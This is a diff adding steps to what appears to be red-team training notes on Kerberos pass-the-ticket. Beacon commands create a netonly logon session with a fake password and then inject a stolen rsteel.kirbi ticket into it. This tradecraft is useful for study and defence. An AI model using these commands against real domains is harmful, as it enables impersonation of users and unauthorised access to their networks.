@@ -49,3 +49,20 @@ If you pass a TGT into a logon session that already has one, then you'll overwri
 The optimal strategy is to create a new logon session that we can impersonate.  This lets us use the Kerberos ticket, without affecting a user's existing logon session.  Before doing so, this `klist` output shows our current LUID is **0x11f831e**.  It contains a TGT and LDAP service ticket for pchilds.
 
 ![[Pasted image 20250710224809.png]]
+
+Create a new logon session using `make_token`, providing a fake password (this assumes that we don't know the user's plaintext password).
+
+```powershell
+beacon> make_token CONTOSO\rsteel FakePass
+[+] Impersonated CONTOSO\rsteel (netonly)
+```
+
+Running `klist` again shows that our current LUID has changed, and there are no tickets in its cache.
+
+![[Pasted image 20250710224949.png]]
+
+Next, `kerberos_ticket_use` will inject the given ticket into this new session.
+
+```powershell
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+```
